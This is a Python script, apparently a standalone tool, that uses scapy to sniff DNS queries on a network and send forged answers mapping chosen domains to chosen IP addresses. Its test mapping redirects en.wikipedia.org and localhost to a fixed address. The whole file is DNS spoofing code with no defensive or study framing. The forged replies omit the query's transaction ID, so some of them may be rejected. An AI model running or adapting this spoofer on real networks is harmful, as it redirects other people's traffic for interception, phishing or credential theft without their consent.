from scapy.all import *
from scapy.layers.dns import *

TEST_MAPPING = {
  "en.wikipedia.org": "172.67.149.198",
  "localhost": "172.67.149.198"
}

def is_dns_query(packet: Packet):
  """
  Checks whether the provided packet is a DNS query
  """
  if DNS in packet and packet.qdcount:
    return True

  return False

def intercept_dns(intercept_map: dict):
  """
  Intercept DNS requests, given a dict where
  {
    "<Domain name>": <DNS answer IP>,
    ...
  }

  Parameters
  -----------
  intercept_map: dict
    Dictionary mapping of domain name to an IP address to answer with
  """

  print('Mapping:')
  for [domain_name, answer_ip] in intercept_map.items():
    print(f'{domain_name} -> {answer_ip}')
  
  def intercept(packet: Packet):
    if is_dns_query(packet):
      origin_src: str = packet['IP'].src
      dns: DNS = packet['DNS']
      requested_domain: bytes = dns.qd.qname
      # Use processed qname field as key for intercept_map
      requested_domain_str: str = requested_domain.decode('utf8')[:-1]

      if(requested_domain_str not in intercept_map):
        return

      print(f'Answering query for {requested_domain_str} with IP {intercept_map[requested_domain_str]}')

      reply_packet = (
        IP(dst=origin_src) /
        UDP(sport=53, dport=packet['UDP'].sport) /
        DNS(
          qr=1,
          an=DNSRR(rrname=requested_domain, rdata=intercept_map[requested_domain_str])
        )
      )
      send(reply_packet)


  # Sniff for DNS packets and answer accordingly
  sniff(prn=intercept)

if __name__ == '__main__':
  intercept_dns(TEST_MAPPING)